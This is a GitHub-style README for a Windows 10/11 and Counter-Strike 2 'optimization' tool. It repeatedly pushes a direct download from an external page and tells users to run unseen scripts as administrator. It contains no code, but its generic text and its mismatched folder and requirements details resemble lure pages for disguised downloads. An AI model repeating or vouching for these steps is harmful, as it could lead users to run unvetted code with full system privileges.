# PC-Optimizations - Optimization Utility

> A compact optimization tool built to improve performance on Windows 10, Windows 11, and Counter-Strike 2, with the goal of making the system feel smoother and game input more responsive.

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryanhub1999/pc-optimizations-windows?style=flat-square)](https://github.com/ryanhub1999/pc-optimizations-windows)

---

<p align="center">
  <a href="https://ryanhub1999.github.io/pc-optimizations-windows/">
    <img src="https://img.shields.io/badge/Download-PC-Optimizations%20Latest-brightgreen?style=for-the-badge" alt="Download PC-Optimizations">
  </a>
</p>

> **[Direct Download - PC-Optimizations v1.0](https://ryanhub1999.github.io/pc-optimizations-windows/)**

---

[Download Latest Build](https://ryanhub1999.github.io/pc-optimizations-windows/)

---

## What PC-Optimizations Does

PC-Optimizations is a purpose-built utility for tightening up Windows settings and reducing common sources of slowdown. It focuses on typical overhead found in Windows 10 and Windows 11, aiming to improve startup behavior, trim background resource use, and make everyday application performance feel more immediate. It is also aimed at gamers who want a cleaner system profile for titles such as Counter-Strike 2.

In addition to broad Windows tuning, the utility includes Counter-Strike 2-specific adjustments intended to address latency, input delay, and frame pacing. Whether the goal is to breathe new life into an older PC or to get a more responsive setup for competitive play, PC-Optimizations offers a simple path to apply these changes without requiring advanced technical setup.

---

## Features

- Windows 10 optimization - adjust services, visual effects, and startup items to make daily use feel faster
- Windows 11 optimization - cut unnecessary resource usage and turn off unneeded modern interface elements
- Counter-Strike 2 optimization - apply settings intended to reduce input delay and support steadier frame rates
- Single-command application - launch the tool and let it automatically handle registry edits and service changes
- Backup and restore capability - roll back the applied changes if you need to undo them
- Lightweight footprint - no persistent services or background tasks remain after use
- Clear status output - view the changes being applied while the tool runs
- Compatible with both Windows 10 and Windows 11 systems

---

## Installation

Clone the repository or download the latest release archive:

```bash
git clone https://github.com/ryanhub1999/pc-optimizations-windows.git
cd PC-Optimizations
```

Once downloaded, extract the files to any folder you prefer. No extra installation procedure is needed.

---

## Usage

Run the optimization script with administrator rights. On Windows, right-click the main file and choose "Run as administrator."

Example workflow:

1. Open Command Prompt or PowerShell as an administrator.
2. Go to the PC-Optimizations directory.
3. Run the matching script for your Windows version or the optimization target you want.

For a quick start, double-click the provided batch or PowerShell file after confirming you have administrator privileges.

---

## Configuration

A plain text configuration file sits in the same folder as the main script. Use it to turn individual tweaks on or off, including disabling animations, stopping background services, or changing network-related parameters. At runtime, the tool reads those choices and applies only the selected settings.

---

## Requirements

- Operating system: Windows 10 (any edition) or Windows 11
- Administrator privileges (required to modify system settings and services)
- .NET Framework 4.7.2 or later (pre-installed on most modern Windows versions)
- At least 50 MB of free disk space for the tool and its configuration

---

## FAQ

**How can I get help?**  
Open an issue in the GitHub repository and include a clear description of the problem plus your Windows version.

**Are updates released regularly?**  
The project is updated from time to time. Check the repository for the latest release notes and version history.

**Can I choose which optimizations run?**  
Yes. Edit the configuration file before running the script to enable or disable individual tweaks.

**What happens if something breaks?**  
The tool saves a backup of the original settings. Use the restore option included in the script to return everything to its prior state.

**Is Counter-Strike 2 optimization separate from Windows optimization?**  
The tool applies general Windows tweaks and CS2-specific changes in a single run. Either category can be disabled in the configuration file.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
